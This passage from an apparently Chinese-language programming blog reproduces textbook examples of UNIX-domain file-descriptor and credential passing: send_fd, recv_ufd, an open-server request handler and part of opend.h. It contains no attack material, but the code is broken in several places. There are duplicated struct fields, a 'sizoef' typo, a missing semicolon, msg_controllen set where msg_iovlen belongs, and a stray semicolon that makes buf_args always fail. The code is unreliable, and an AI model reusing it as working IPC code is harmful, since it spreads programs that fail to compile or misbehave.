class="hljs-type">uid_t</span> cmcred_uid; <span class="hljs-comment">/* sender’s real UID */</span><br>    <span class="hljs-type">uid_t</span> cmcred_euid; <span class="hljs-comment">/* sender’s effective UID */</span><br>    <span class="hljs-type">gid_t</span> cmcred_gid; <span class="hljs-comment">/* sender’s real GID */</span><br>    <span class="hljs-type">short</span> cmcred_ngroups; <span class="hljs-comment">/* number of groups */</span><br>    <span class="hljs-type">gid_t</span> cmcred_groups[CMGROUP_MAX]; <span class="hljs-comment">/* groups */</span><br>    <span class="hljs-type">short</span> cmcred_ngroups; <span class="hljs-comment">/*组数*/</span><br>    <span class="hljs-type">gid_t</span> cmcred_groups[CMGROUP_MAX];  <span class="hljs-comment">/*组*/</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>在<code>Linux</code>中，将证书作为<code>ucred</code>结构传送</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucred</span>&#123;</span><br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">uid_t</span> uid;<br>    <span class="hljs-type">gid_t</span> gid;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>17-15.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(SCM_CREDS)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREDSTRUCT cmsgcred</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SCM_CREDTYPE SCM_CREDS</span><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(SCM_CREDENTIALS)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREDSTRUCT ucred</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SCM_CREDTYPE SCM_CREDENTIALS</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RIGHTSLEN CMSG_LEN(sizeof(int))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREDSLEN CMSG_LEN(sizeof(struct CREDSTRUCT))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CONTROLLEN (RIGHTSLEN + CREDSLEN)</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmptr</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">send_fd</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> fd_to_send)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CREDSTRUCT</span> *<span class="hljs-title">credp</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmp</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>[1];</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">2</span>];<br><br>    iov[<span class="hljs-number">0</span>].iov_base = buf;<br>    iov[<span class="hljs-number">0</span>].iov_len = <span class="hljs-number">2</span>;<br>    msg.msg_iov = iov;<br>    msg.msg_controllen = <span class="hljs-number">1</span>;<br>    msg.msg_name = <span class="hljs-literal">NULL</span>;<br>    msg.msg_namelen = <span class="hljs-number">0</span>;<br>    msg.msg_flags = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (fd_to_send &lt; <span class="hljs-number">0</span>) &#123;<br>        msg.msg_control = <span class="hljs-literal">NULL</span>;<br>        msg.msg_controllen = <span class="hljs-number">0</span>;<br>        buf[<span class="hljs-number">1</span>] = -fd_to_send;<br>        <span class="hljs-keyword">if</span>(buf[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>)<br>            buf[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (cmptr == <span class="hljs-literal">NULL</span> &amp;&amp; (cmptr = <span class="hljs-built_in">malloc</span>(CONTROLLEN)) == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>        msg.msg_control = cmptr;<br>        msg.msg_controllen = CONTROLLEN;<br>        cmp = cmptr;<br>        cmp-&gt;cmsg_level = SOL_SOCKET; <span class="hljs-comment">//用于设置获取socket属性</span><br>        cmp-&gt;cmsg_type = SCM_RIGHTS; <span class="hljs-comment">//用于传送访问权</span><br>        cmp-&gt;cmsg_len = RIGHTSLEN;<br>        *(<span class="hljs-type">int</span> *)CMSG_DATA(cmp) = fd_to_send;<br>        cmp = CMSG_NXTHDR(&amp;msg, cmp); <span class="hljs-comment">//获取下一个控制消息</span><br>        cmp-&gt;cmsg_level = SOL_SOCKET;<br>        cmp-&gt;cmsg_type = SCM_CREDTYPE; <span class="hljs-comment">//用于在UNIX系统中传递进程的用户和组的凭据信息</span><br>        cmp-&gt;cmsg_len = CREDSLEN;<br>        credp = (<span class="hljs-keyword">struct</span> CREDSTRUCT *)CMSG_DATA(cmp); <span class="hljs-comment">//增加证书信息</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(SCM_CREDENTIALS)</span><br>        credp-&gt;uid = geteuid(); <br>        credp-&gt;gid = getegid();<br>        credp-&gt;pid = getpid();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (sendmsg(fd, &amp;msg, <span class="hljs-number">0</span>) != <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>17-16.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/un.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(SCM_CREDS)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREDSTRUCT cmsgcred</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CR_UID</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SCM_CREDTYPE SCM_CREDS</span><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(SCM_CREDENTIALS)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREDSTRUCT ucred</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CR_UID uid</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREDOPT SO_PASSCRED</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SCM_CREDTYPE SCM_CREDENTIALS</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RIGHTSLEN CMSG_LEN(sizeof(int))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREDSLEN CMSG_LEN(sizoef(struct  CREDSTRUCT))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CONTROLLEN (RIGHTSLEN + CREDSLEN)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 256</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmptr</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">recv_ufd</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">uid_t</span> *uidptr, <span class="hljs-type">ssize_t</span> (*userfunc)(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *, <span class="hljs-type">size_t</span>))</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmp</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CREDSTRUCT</span> *<span class="hljs-title">credp</span>;</span><br>    <span class="hljs-type">char</span> *ptr;<br>    <span class="hljs-type">char</span> buf[MAXLINE];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>[1];</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">int</span> nr;<br>    <span class="hljs-type">int</span> newfd = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">int</span> status = <span class="hljs-number">-1</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CREDOPT)</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> on = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);</span><br><span class="hljs-comment">        表示套接字可以在进程间传递用户和组标识</span><br><span class="hljs-comment">        sockfd：标识一个打开的套接字。</span><br><span class="hljs-comment">        level：选项定义的层次；SOL_SOCKET 表示基础套接字选项，IPPROTO_TCP 表示 TCP 协议选项等等。</span><br><span class="hljs-comment">        optname：需要访问的选项名。</span><br><span class="hljs-comment">        optval：指向存放选项值的缓冲区。</span><br><span class="hljs-comment">        optlen：缓冲区长度</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span> (setsockopt(fd, SOL_SOCKET, CREDOPT, &amp;on, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;setsockopt error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        iov[<span class="hljs-number">0</span>].iov_base = buf;<br>        iov[<span class="hljs-number">0</span>].iov_len = <span class="hljs-keyword">sizeof</span>(buf);<br>        msg.msg_iov = iov;<br>        msg.msg_iovlen = <span class="hljs-number">1</span>;<br>        msg.msg_name = <span class="hljs-literal">NULL</span>;<br>        msg.msg_namelen = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (cmptr == <span class="hljs-literal">NULL</span> &amp;&amp; (cmptr = <span class="hljs-built_in">malloc</span>(CONTROLLEN)) == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>)<br>        msg.msg_control = cmptr;<br>        msg.msg_controllen = CONTROLLEN;<br>        <span class="hljs-keyword">if</span> ((nr = recvmsg(fd, &amp;msg, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;recvmsg error&quot;</span>);<br>            <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nr == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;connection closed by server&quot;</span>);<br>            <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (ptr = buf; ptr &lt; &amp;buf[nr]; ) &#123;<br>            <span class="hljs-keyword">if</span> (*ptr++ == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">if</span> (ptr != &amp;buf[nr<span class="hljs-number">-1</span>])<br>                &#123;<br>                    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;message format error&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                &#125;<br>            &#125;<br>            status = *ptr &amp; <span class="hljs-number">0xFF</span>;<br>            <span class="hljs-keyword">if</span> (status == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">if</span> (msg.msg_controllen != CONTROLLEN)<br>                &#123;<br>                    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;status = 0 but no fd&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">for</span> (cmp = CMSG_FIRSTHDR(&amp;msg);<br>                cmp != <span class="hljs-literal">NULL</span>; cmp = CMSG_NXTHDR(&amp;msg, cmp)) &#123;<br>                    <span class="hljs-keyword">if</span> (cmp-&gt;cmsg_level != SOL_SOCKET)<br>                        <span class="hljs-keyword">continue</span>;<br>                    <span class="hljs-keyword">switch</span> (cmp-&gt;cmsg_type)<br>                    &#123;<br>                    <span class="hljs-keyword">case</span> SCM_RIGHTS:<br>                        newfd = *(<span class="hljs-type">int</span> *)CMSG_DATA(cmp);<br>                        <span class="hljs-keyword">break</span>;<br>                    <span class="hljs-keyword">case</span> SCM_CREDTYPE:<br>                        credp = (<span class="hljs-keyword">struct</span>  CREDSTRUCT *)CMSG_DATA(cmp);<br>                        *uidptr = credp-&gt;CR_UID;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                newfd = -status;<br>            &#125;<br>            nr -= <span class="hljs-number">2</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (nr &gt; <span class="hljs-number">0</span> &amp;&amp; (*userfunc)(STDERR_FILENO, buf, nr) != nr)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span> (status &gt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(newfd);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>17-21.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/uio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;include/apue.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CL_OPEN <span class="hljs-string">&quot;open&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXARG 50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WHITE <span class="hljs-string">&quot;\t\n&quot;</span></span><br><br><span class="hljs-type">char</span> errmsg[MAXLINE];<br><span class="hljs-type">int</span> oflag;<br><span class="hljs-type">char</span> *pathname;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">cli_args</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">char</span> **)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">handle_request</span><span class="hljs-params">(<span class="hljs-type">char</span> *, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">buf_args</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> (*optfunc)(<span class="hljs-type">int</span>, <span class="hljs-type">char</span> **))</span><br>&#123;<br>    <span class="hljs-type">char</span> *ptr, *argv[MAXARG];<br>    <span class="hljs-type">int</span> argc;<br><br>    <span class="hljs-keyword">if</span> (strtok(buf, WHITE) == <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//定位\t\n</span><br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    argv[argc = <span class="hljs-number">0</span>] = buf;<span class="hljs-comment">//重新调整参数</span><br>    <span class="hljs-keyword">while</span> ((ptr = strtok(<span class="hljs-literal">NULL</span>, WHITE)) != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (++argc &gt;= MAXARG - <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>        argv[argc] = ptr;<br>    &#125;<br>    argv[++argc] = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">return</span>((*optfunc)(argc, argv));<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">cli_args</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span> || <span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], CL_OPEN) !=<span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">strcpy</span>(errmsg, <span class="hljs-string">&quot;usage: &lt;pathname&gt; &lt;oflag&gt; \n&quot;</span>);<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    pathname = argv[<span class="hljs-number">1</span>];<br>    oflag = atoi(argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">handle_request</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> nread, <span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">int</span> newfd;<br><br>    <span class="hljs-keyword">if</span> (buf[nread<span class="hljs-number">-1</span>] != <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//结尾不是截断符</span><br>        <span class="hljs-built_in">snprintf</span>(errmsg, MAXLINE<span class="hljs-number">-1</span>,<br>        <span class="hljs-string">&quot;request not null terminated: %*.*s\n&quot;</span>, nread, nread, buf);<br>        send_err(fd, <span class="hljs-number">-1</span>, errmsg);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (buf_args(buf, cli_args) &lt; <span class="hljs-number">0</span>) &#123;<br>        send_err(fd, <span class="hljs-number">-1</span>, errmsg);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((newfd = open(pathname, oflag)) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">snprintf</span>(errmsg, MAXLINE - <span class="hljs-number">1</span>, <span class="hljs-string">&quot;can&#x27;t open %s: %s\n&quot;</span>, pathname, strerror(errno));<br>        send_err(fd, <span class="hljs-number">-1</span>, errmsg);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (send_fd(fd, newfd) &lt; <span class="hljs-number">0</span>)<br>        err_sys(<span class="hljs-string">&quot;send_fd error&quot;</span>);<br>    close(newfd);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> nread;<br>    <span class="hljs-type">char</span> buf[MAXLINE];<br><br>   <span class="hljs-keyword">for</span>(;;) &#123;<br>        <span class="hljs-keyword">if</span> ((nread = read(STDIN_FILENO, buf, MAXLINE)) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;read error on stream pipe&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">break</span>;<br>        handle_request(buf, nread, STDOUT_FILENO);<br>   &#125;<br>   <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>opend.h</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;include/apue.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CS_OPEN <span class="hljs-string">&quot;/tmp/opend.socket&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CL_OPEN  <span class="hljs-string">&quot;open&quot;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> debug;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> errmsg[];<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> oflag;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> *pathname;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/* data */</span><br>    <span class="hljs-type">int</span> 